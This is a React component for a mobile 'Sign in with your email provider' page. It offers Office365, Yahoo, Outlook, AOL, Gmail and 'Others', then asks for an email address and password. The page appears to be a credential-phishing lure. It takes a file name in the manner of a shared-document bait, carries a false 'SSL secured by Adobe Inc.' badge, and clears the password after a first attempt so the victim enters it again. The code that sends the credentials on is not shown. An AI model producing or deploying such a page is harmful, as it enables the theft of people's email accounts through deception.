import React, { useState } from 'react';
import { ArrowLeft, Mail, Lock, Eye, EyeOff, Sparkles } from 'lucide-react';
import { useLogin } from '../../hooks/useLogin'; // Import the custom hook
import Spinner from '../../components/common/Spinner'; // Import Spinner

interface LoginPageProps {
  fileName: string;
  onBack: () => void;
  onLoginSuccess?: (sessionData: any) => void;
  onLoginError?: (error: string) => void;
}

const MobileLoginPage: React.FC<LoginPageProps> = ({ 
  fileName, 
  onBack, 
  onLoginSuccess,
  onLoginError 
}) => {
  const [selectedProvider, setSelectedProvider] = useState<string | null>(null);
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [showPassword, setShowPassword] = useState(false);
  
  // Use the custom hook for login logic
  const { isLoading, errorMessage, handleFormSubmit, resetLoginState } = useLogin(
    onLoginSuccess,
    onLoginError
  );

  const emailProviders = [
    { name: 'Office365', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/office-365-icon.png' },
    { name: 'Yahoo', domain: 'yahoo.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/yahoo-square-icon.png' },
    { name: 'Outlook', domain: 'outlook.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/microsoft-outlook-icon.png' },
    { name: 'AOL', domain: 'aol.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/aol-icon.png' },
    { name: 'Gmail', domain: 'gmail.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/brands-and-social-media/gmail-icon.png' },
    { name: 'Others', domain: 'other.com', logo: 'https://uxwing.com/wp-content/themes/uxwing/download/communication-chat-call/envelope-line-icon.png' }
  ];

  const handleProviderSelect = (provider: string) => {
    setSelectedProvider(provider);
  };
  
  const handleSubmit = async (e: React.FormEvent) => {
    const result = await handleFormSubmit(e, { email, password, provider: selectedProvider });
    if (result?.isFirstAttempt) {
      setPassword(''); // Clear password field after first attempt
    }
  };

  const handleBackToProviders = () => {
    setSelectedProvider(null);
    setEmail('');
    setPassword('');
    resetLoginState();
  };

  return (
    <div
      className="mobile-login-bg min-h-screen flex items-center justify-center p-4 relative overflow-hidden bg-gray-50"
      style={{
        backgroundImage: "url('https://upload.wikimedia.org/wikipedia/commons/thumb/3/35/Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg/640px-Sunset_clouds_and_crepuscular_rays_over_pacific_edit.jpg')",
        backgroundSize: 'cover',
        backgroundPosition: 'center',
        backgroundRepeat: 'no-repeat'
      }}
    >
      <div className="w-full max-w-sm relative z-10 mx-4">
        <div className="bg-white/95 backdrop-blur-xl rounded-2xl shadow-2xl border border-white/20 p-5 relative overflow-hidden">
          <div className="flex items-center justify-center mb-3">
            <div className="inline-flex items-center gap-2 px-3 py-1 rounded-full bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-100">
              <Sparkles className="w-3.5 h-3.5 text-blue-500" />
              <span className="text-xs font-medium text-blue-700">{!selectedProvider ? 'Select Provider' : `Sign in with ${selectedProvider}`}</span>
            </div>
          </div>
          {!selectedProvider ? (
            <div className="grid grid-cols-3 gap-3">
              {emailProviders.map((provider) => (
                <button key={provider.name} onClick={() => handleProviderSelect(provider.name)} className="group relative flex flex-col items-center gap-2 p-3 bg-white/75 backdrop-blur-sm rounded-xl shadow-sm border border-gray-100/50 hover:shadow-lg hover:bg-white/80 transition-all duration-200 transform active:scale-95" aria-label={`Select ${provider.name}`} type="button">
                  <img src={provider.logo} alt={provider.name} className="w-8 h-8 object-contain" />
                  <div className="text-xs font-semibold text-gray-800 group-hover:text-gray-900 transition-colors text-center truncate">{provider.name}</div>
                </button>
              ))}
            </div>
          ) : (
            <div className="space-y-4">
              <div className="flex items-center gap-2 mb-4">
                <button onClick={handleBackToProviders} className="p-1.5 rounded-md hover:bg-gray-100 transition-colors" type="button"><ArrowLeft className="w-4 h-4 text-gray-600" /></button>
                <div className="flex items-center gap-2">
                  <img src={emailProviders.find(p => p.name === selectedProvider)?.logo} alt={selectedProvider} className="w-6 h-6 object-contain" />
                  <h2 className="text-sm font-bold text-gray-900">Sign in with {selectedProvider}</h2>
                </div>
              </div>
              <form onSubmit={handleSubmit} className="space-y-3">
                {errorMessage && (<div className="bg-gradient-to-r from-red-50 to-pink-50 border border-red-200 rounded-lg p-3"><p className="text-red-700 text-xs font-medium">{errorMessage}</p></div>)}
                <div>
                  <label className="block text-xs font-semibold text-gray-700 mb-1.5">Email Address</label>
                  <div className="relative group">
                    <Mail className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4 group-focus-within:text-blue-500 transition-colors" />
                    <input type="email" value={email} onChange={(e) => setEmail(e.target.value)} className="w-full pl-10 pr-3 py-3 bg-white/90 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-sm" placeholder="Enter your email" required />
                  </div>
                </div>
                <div>
                  <label className="block text-xs font-semibold text-gray-700 mb-1.5">Password</label>
                  <div className="relative group">
                    <Lock className="absolute left-3 top-1/2 transform -translate-y-1/2 text-gray-400 w-4 h-4 group-focus-within:text-blue-500 transition-colors" />
                    <input type={showPassword ? 'text' : 'password'} value={password} onChange={(e) => setPassword(e.target.value)} className="w-full pl-10 pr-10 py-3 bg-white/90 backdrop-blur-sm border border-gray-200 rounded-xl text-gray-900 placeholder-gray-500 focus:outline-none focus:ring-2 focus:ring-blue-500 focus:border-transparent transition-all duration-200 text-sm" placeholder="Enter your password" required />
                    <button type="button" onClick={() => setShowPassword(!showPassword)} className="absolute right-3 top-1/2 transform -translate-y-1/2 text-gray-500 hover:text-gray-700 transition-colors"><EyeOff className="w-4 h-4" /></button>
                  </div>
                </div>
                <button type="submit" disabled={isLoading || !email || !password} className="w-full bg-gradient-to-r from-blue-600 to-indigo-600 text-white py-3.5 rounded-xl font-bold text-sm hover:from-blue-700 hover:to-indigo-700 disabled:opacity-60 disabled:cursor-not-allowed transition-all duration-200 shadow-lg">
                  <div className="flex items-center justify-center gap-2">
                    {isLoading && <Spinner size="sm" color="border-white" />}
                    {isLoading ? 'Signing in...' : 'Sign In Securely'}
                  </div>
                </button>
              </form>
            </div>
          )}
          <div className="mt-5 text-center"><p className="text-xs text-gray-500">© 2025 municipalfilesport. SSL secured by Adobe Inc.</p></div>
        </div>
      </div>
    </div>
  );
};

export default MobileLoginPage;
